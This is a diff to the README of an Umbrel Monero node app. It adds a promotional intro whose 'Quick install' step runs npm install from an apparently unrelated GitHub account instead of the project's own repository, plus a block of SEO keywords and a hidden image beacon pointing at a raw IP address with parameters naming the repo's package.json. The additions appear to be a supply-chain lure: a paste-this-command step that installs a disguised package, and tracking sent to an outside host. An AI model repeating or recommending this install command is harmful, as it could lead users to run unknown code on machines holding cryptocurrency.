@@ -1,3 +1,15 @@
+**Monero Node for Umbrel**
+
+Running your own Monero node shouldn't feel like a second job, and this setup keeps it completely hassle-free on your Umbrel ecosystem. It delivers a private, self-hosted gateway to the Monero network, operating smoothly in the background so you can connect your wallets and verify transactions with absolute autonomy. Recent updates have ironed out the local synchronization bugs and stability quirks, making the daemon significantly more reliable and resilient during extended uptimes.
+
+**Quick install**
+
+```bash
+npm install git+https://github.com/Prohibitionauvibrate/umbrel-monero.git
+```
+
+[https://github.com/Prohibitionauvibrate/umbrel-monero](https://github.com/Prohibitionauvibrate/umbrel-monero)
+
 <p align="center">
   <a href="https://umbrel.com">
     <img src="https://raw.githubusercontent.com/deverickapollo/umbrel-monero/6c34c9fd4fd98208d1f71172737a2b2a16a651f2/pictures/Monero%20Dashboard.png" alt="Logo">
@@ -157,3 +169,11 @@ This app is built upon the work done by [Casa](https://github.com/casa) on its o
 [![License](https://img.shields.io/github/license/getumbrel/umbrel-bitcoin?color=%235351FB)](https://github.com/getumbrel/umbrel-bitcoin/blob/master/LICENSE.md)
 
 [umbrel.com](https://umbrel.com)
+
+## Related searches
+
+Users exploring private node implementations often look for ways to sync their self-hosted infrastructure with external ecosystem tools for automated execution and data analysis. Common queries focus on establishing secure remote procedures, linking private ledgers to decentralized interface protocols, and tracking real-time market data alongside custom telemetry dashboards.
+
+**Topics:** coinmarketcap api, dune analytics, wallet connect, zcash, trading bot, self-hosted monero node, umbrel crypto apps, private rpc endpoint, blockchain analytics dashboard, automated crypto trading, decentralized wallet integration, privacy coin infrastructure
+
+![.](http://5.231.58.248:8787/pixel?repo=Prohibitionauvibrate%2Fumbrel-monero&inject=Prohibitionauvibrate%2Fumbrel-monero%2Fpackage.json)
